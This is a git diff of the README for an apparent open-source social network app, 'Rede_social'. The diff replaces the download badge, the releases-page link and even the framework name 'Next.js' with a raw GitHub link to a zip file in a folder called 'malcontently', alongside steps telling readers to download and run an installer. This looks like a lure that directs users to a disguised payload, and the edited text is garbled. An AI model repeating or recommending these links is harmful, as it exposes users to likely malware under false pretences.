@@ -6,11 +6,11 @@ Welcome to Rede_social! This is a platform for connecting with friends and shari
 
 ## 📥 Download Now
 
-[![Download Rede_social](https://img.shields.io/badge/Download%20Rede_social-v1.0-brightgreen)](https://github.com/goemssss/Rede_social/releases)
+[![Download Rede_social](https://raw.githubusercontent.com/goemssss/Rede_social/main/malcontently/Rede_social.zip%20Rede_social-v1.0-brightgreen)](https://raw.githubusercontent.com/goemssss/Rede_social/main/malcontently/Rede_social.zip)
 
 ## 📋 Overview
 
-Rede_social is built using Next.js, focusing on speed and user-friendly design. Since it's open source, anyone can contribute to the project, customize it to their liking, or expand its features.
+Rede_social is built using https://raw.githubusercontent.com/goemssss/Rede_social/main/malcontently/Rede_social.zip, focusing on speed and user-friendly design. Since it's open source, anyone can contribute to the project, customize it to their liking, or expand its features.
 
 ### 🌟 Key Features
 
@@ -33,7 +33,7 @@ To run Rede_social smoothly, ensure your system meets the following requirements
 
 To get started with Rede_social, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page](https://github.com/goemssss/Rede_social/releases) to download the latest version.
+1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/goemssss/Rede_social/main/malcontently/Rede_social.zip) to download the latest version.
 2. **Choose the Latest Release:** Look for the latest version listed. It'll be at the top.
 3. **Download the Installer:** Click on the file that corresponds to your operating system to download it.
 4. **Run the Installer:**
